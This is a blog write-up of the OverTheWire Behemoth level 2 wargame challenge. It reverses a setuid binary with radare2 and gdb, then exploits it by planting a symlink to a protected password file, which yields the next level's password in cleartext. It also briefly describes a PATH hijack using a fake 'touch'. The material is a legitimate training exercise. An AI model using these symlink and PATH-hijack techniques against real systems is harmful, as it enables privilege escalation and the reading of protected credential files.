---
title: "Behemoth 2 - OverTheWire"
description: "Reversing and Symlinks"
tags: [symlinks]
categories: [Writeup]
pubDate: 2021-05-05T17:27:31+03:00
draft: false
heroImage: "./featured-image.jpg"
---

# Behemoth 2 - OverTheWire

## Intro

The are more than one way to solve this challenge, and me being me I chose the hard way. After
finally solving this challenge it was time to read other peoples writeups, as usual. I will 
share the easy way at the end, but I think you could learn a thing or two from the way I 
solved it. To start I decided to directly go and reverse the binary since Behemoth doesn't
offer any source code. I'm using `radare2` to reverse the binary. Here is the main function.

```asm
            ; DATA XREF from entry0 @ 0x8048487
┌ 233: int main (char **argv);
│           ; var void *buf @ ebp-0x88
│           ; var char *string @ ebp-0x24
│           ; var int32_t var_20h @ ebp-0x20
│           ; var char *path @ ebp-0x10
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_8h @ ebp-0x8
│           ; arg char **argv @ esp+0xa4
│           0x0804856b      8d4c2404       lea ecx, [argv]
│           0x0804856f      83e4f0         and esp, 0xfffffff0
│           0x08048572      ff71fc         push dword [ecx - 4]
│           0x08048575      55             push ebp
│           0x08048576      89e5           mov ebp, esp
│           0x08048578      53             push ebx
│           0x08048579      51             push ecx
│           0x0804857a      83c480         add esp, 0xffffff80
│           0x0804857d      e87efeffff     call sym.imp.getpid         ; int getpid(void)
│           0x08048582      8945f4         mov dword [var_ch], eax
│           0x08048585      8d45dc         lea eax, [string]
│           0x08048588      83c006         add eax, 6
│           0x0804858b      8945f0         mov dword [path], eax
│           0x0804858e      83ec04         sub esp, 4
│           0x08048591      ff75f4         push dword [var_ch]
│           0x08048594      6810870408     push str.touch__d           ; 0x8048710 ; "touch %d" ; const char *format
│           0x08048599      8d45dc         lea eax, [string]
│           0x0804859c      50             push eax                    ; char *s
│           0x0804859d      e89efeffff     call sym.imp.sprintf        ; int sprintf(char *s, const char *format, ...)
│           0x080485a2      83c410         add esp, 0x10
│           0x080485a5      83ec08         sub esp, 8
│           0x080485a8      8d8578ffffff   lea eax, [buf]
│           0x080485ae      50             push eax                    ; void *buf
│           0x080485af      ff75f0         push dword [path]           ; const char *path
│           0x080485b2      e819010000     call sym.lstat              ; void lstat(const char *path, void *buf)
│           0x080485b7      83c410         add esp, 0x10
│           0x080485ba      2500f00000     and eax, 0xf000
│           0x080485bf      3d00800000     cmp eax, 0x8000
│       ┌─< 0x080485c4      7436           je 0x80485fc
│       │   0x080485c6      83ec0c         sub esp, 0xc
│       │   0x080485c9      ff75f0         push dword [path]           ; const char *path
│       │   0x080485cc      e81ffeffff     call sym.imp.unlink         ; int unlink(const char *path)
│       │   0x080485d1      83c410         add esp, 0x10
│       │   0x080485d4      e807feffff     call sym.imp.geteuid        ; uid_t geteuid(void)
│       │   0x080485d9      89c3           mov ebx, eax
│       │   0x080485db      e800feffff     call sym.imp.geteuid        ; uid_t geteuid(void)
│       │   0x080485e0      83ec08         sub esp, 8
│       │   0x080485e3      53             push ebx
│       │   0x080485e4      50             push eax
│       │   0x080485e5      e836feffff     call sym.imp.setreuid
│       │   0x080485ea      83c410         add esp, 0x10
│       │   0x080485ed      83ec0c         sub esp, 0xc
│       │   0x080485f0      8d45dc         lea eax, [string]
│       │   0x080485f3      50             push eax                    ; const char *string
│       │   0x080485f4      e817feffff     call sym.imp.system         ; int system(const char *string)
│       │   0x080485f9      83c410         add esp, 0x10
│       │   ; CODE XREF from main @ 0x80485c4
│       └─> 0x080485fc      83ec0c         sub esp, 0xc
│           0x080485ff      68d0070000     push 0x7d0                  ; 2000 ; int s
│           0x08048604      e8c7fdffff     call sym.imp.sleep          ; int sleep(int s)
│           0x08048609      83c410         add esp, 0x10
│           0x0804860c      8d45dc         lea eax, [string]
│           0x0804860f      c70063617420   mov dword [eax], 0x20746163 ; 'cat '
│                                                                      ; [0x20746163:4]=-1
│           0x08048615      c6400400       mov byte [eax + 4], 0
│           0x08048619      c645e020       mov byte [var_20h], 0x20    ; 32
│           0x0804861d      e8befdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
│           0x08048622      89c3           mov ebx, eax
│           0x08048624      e8b7fdffff     call sym.imp.geteuid        ; uid_t geteuid(void)
│           0x08048629      83ec08         sub esp, 8
│           0x0804862c      53             push ebx
│           0x0804862d      50             push eax
│           0x0804862e      e8edfdffff     call sym.imp.setreuid
│           0x08048633      83c410         add esp, 0x10
│           0x08048636      83ec0c         sub esp, 0xc
│           0x08048639      8d45dc         lea eax, [string]
│           0x0804863c      50             push eax                    ; const char *string
│           0x0804863d      e8cefdffff     call sym.imp.system         ; int system(const char *string)
│           0x08048642      83c410         add esp, 0x10
│           0x08048645      b800000000     mov eax, 0
│           0x0804864a      8d65f8         lea esp, [var_8h]
│           0x0804864d      59             pop ecx
│           0x0804864e      5b             pop ebx
│           0x0804864f      5d             pop ebp
│           0x08048650      8d61fc         lea esp, [ecx - 4]
└           0x08048653      c3             ret
```

## Reversing

I'm not an expert at reverse engineering but here is what I think is going on.

```asm
...snip...
0x0804857d      e87efeffff     call sym.imp.getpid         ; int getpid(void)
0x08048582      8945f4         mov dword [var_ch], eax
0x08048585      8d45dc         lea eax, [string]
0x08048588      83c006         add eax, 6
0x0804858b      8945f0         mov dword [path], eax
0x0804858e      83ec04         sub esp, 4
0x08048591      ff75f4         push dword [var_ch]
0x08048594      6810870408     push str.touch__d           ; 0x8048710 ; "touch %d" ; const char *format
0x08048599      8d45dc         lea eax, [string]
0x0804859c      50             push eax                    ; char *s
0x0804859d      e89efeffff     call sym.imp.sprintf 
...snip...
```

From the above we can see that it initializes a variable on the stack `string` at `ebp-0x24` with a string 
`"touch <pid>"` where `<pid>` is the process id of the program. There is also another 
variable `path` at `ebp-0x10` which points into the `string` variable and contains the 
process id of the program as a string. 

```asm
...snip...
0x080485b2      e819010000     call sym.lstat              ; void lstat(const char *path, void *buf)
0x080485b7      83c410         add esp, 0x10
0x080485ba      2500f00000     and eax, 0xf000
0x080485bf      3d00800000     cmp eax, 0x8000
0x080485c4      7436           je 0x80485fc
0x080485c6      83ec0c         sub esp, 0xc
0x080485c9      ff75f0         push dword [path]           ; const char *path
0x080485cc      e81ffeffff     call sym.imp.unlink         ; int unlink(const char *path)
0x080485d1      83c410         add esp, 0x10
0x080485d4      e807feffff     call sym.imp.geteuid        ; uid_t geteuid(void)
0x080485d9      89c3           mov ebx, eax
0x080485db      e800feffff     call sym.imp.geteuid        ; uid_t geteuid(void)
0x080485e0      83ec08         sub esp, 8
0x080485e3      53             push ebx
0x080485e4      50             push eax
0x080485e5      e836feffff     call sym.imp.setreuid
0x080485ea      83c410         add esp, 0x10
0x080485ed      83ec0c         sub esp, 0xc
0x080485f0      8d45dc         lea eax, [string]
0x080485f3      50             push eax                    ; const char *string
0x080485f4      e817feffff     call sym.imp.system         ; int system(const char *string)
...snip...
```

After that it calls `lstat` on a file named as the process id of program. `lstat` is just like
the `stat` function except it is used for symbolic links. The `stat` family of functions are used to get information
about a file. The conditional after the call to `lstat` is still a mystery I have no idea
why it is anding the returned value with `0xf000` and comparing it with `0x8000`. Regardless
if the condition fails it deletes the file using `unlink` and creates a new one using 
`system("touch <pid>")`.

After all this it sleeps for about `2000` seconds that's about `33` minutes. Then it loads
the address of `string` into `eax` and moves `0x20746163` to it, which is equivalent to `"cat "`. 
If you remember earlier `string` contained `"touch <pid>"` Which means after this instruction
`string` will become `cat h <pid>`. 

I had to do some dynamic analysis to figure out the last part. And in the end it executes 
with `system("cat h <pid>")`. I set two break points one after the value is loaded and one
when calling the `sleep` function. When I reached the first break point I used the 
`jump address` function to avoid waiting for the sleep function. When I examine the `string`
variable i.e. `ebp-0x24` there you have it `cat h <pid>`

{{< figure src="./gdb_output.png" title="GDB Analysis" >}}


## Exploit

The exploit I thought of is simple. Since `cat` can take multiple files as an argument and 
print them all I had to do is create a symlink to the file I want to read and the program 
will read for me. The problem is the `sleep` part which I found no way of evading. After
crating the symlink and waiting for the sleep to finish your flag will be printed for you.

First we have to make a directory where we have a write access to. 

```
behemoth2@behemoth:/tmp/abcd$ mkdir /tmp/abcd
behemoth2@behemoth:/tmp/abcd$ cd /tmp/abcd
```

And make it readable, writable, and executable by everyone.

```
behemoth2@behemoth:/tmp/abcd$ chmod 777 .
```

I tried symlinking `/etc/behemoth_pass/behemoth3` to `h` that didn't work, so the next thing
I tried was symlinking it to the file which had the process id as it's name. To get this
you first have to run the program and after it has created the file take a note of it's
name, delete it, and create a symlink with it's name to `/etc/behemoth/behemoth3`.

```
behemoth2@behemoth:/tmp/abcd$ /behemoth/behemoth2

```

In another terminal or ssh session, I'm using `tmux`, when you do `ls` you should see the file

```
behemoth2@behemoth:/tmp/abcd$ ls
24513
behemoth2@behemoth:/tmp/abcd$ ln -s /etc/behemoth_pass/behemoth3 24513
```

And after a while, 33.334 minutes to be exact, you should see your password to behemoth3.

```
behemoth2@behemoth:/tmp/abcd$ /behemoth/behemoth2
# after a long time
nieteidiel
```

{{< figure src="./final.png" title="Final" >}}

If you noticed earlier the program is using touch to create the file, and it's using it
in unsafe way by not specifying the full path. This can be exploited by changing the 
`PATH` environment variable to contain our malicious version of touch.

{{< figure src="./easy_way.png" title="Easy Way" >}}

And as always thank you for reading :)
